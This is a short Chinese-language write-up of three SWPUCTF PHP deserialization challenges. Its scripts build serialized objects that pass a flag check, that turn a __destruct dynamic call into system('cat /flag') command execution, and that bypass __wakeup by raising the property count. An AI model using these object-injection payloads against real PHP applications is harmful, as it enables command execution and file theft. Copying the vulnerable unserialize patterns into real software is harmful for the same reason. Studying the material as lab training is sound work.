##### [SWPUCTF 2021 新生赛]ez_unserialize

[NSS](https://www.ctfer.vip/problem/426)

- ```php
  <?php
  class wllm{
  
      public $admin;
      public $passwd;
  
      public function __construct(){
          $this->admin ="admin";
          $this->passwd = "ctf";
      }
  
      public function __destruct(){
          if($this->admin === "admin" && $this->passwd === "ctf"){
              include("flag.php");
              echo $flag;
          }else{
              echo $this->admin;
              echo $this->passwd;
              echo "Just a bit more!";
          }
      }
  }
  
  $p = new wllm();
  $s = serialize($p);
  echo $s;
  ?>
  ```

##### [SWPUCTF 2022 新生赛]1z_unserialize

[NSS](https://www.ctfer.vip/problem/2883)

- ```php
  <?php
  
  class lyh{
      public $url = 'NSSCTF.com';
      public $lt="eval";
      public $lly="system(ls /)";
  
      function  __destruct()
      {
          $a = $this->lt;
  
          $a($this->lly);
      }
  
  
  }
  $class = new lyh();
  $str = serialize($class);
  echo $str;
  ?>
  ```

  输出 `Fatal error:  Call to undefined function eval() in /var/www/html/index.php on line 12` ，知 eval 被禁了。

- ```php
  public $lt="system";
  public $lly="ls /";
  ```

- ```php
  public $lt="system";
  public $lly="cat /flag";
  ```

##### [SWPUCTF 2022 新生赛]ez_ez_unserialize

[NSS](https://www.ctfer.vip/problem/3082)

- wakeup() 的绕过：

  ```php
  <?php
  class X
  {
      public $x = __FILE__;
      function __construct($x)
      {
          $this->x = $x;
      }
      function __wakeup()
      {
          if ($this->x !== __FILE__) {
              $this->x = __FILE__;
          }
      }
      function __destruct()
      {
          highlight_file($this->x);
      }
  }
  $class = new X(fllllllag.php);
  $str = serialize($class);
  echo $str;
  ?>
  ```

  得到 `O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}` ，改为 `O:1:"X":2:{s:1:"x";s:13:"fllllllag.php";}` 即可。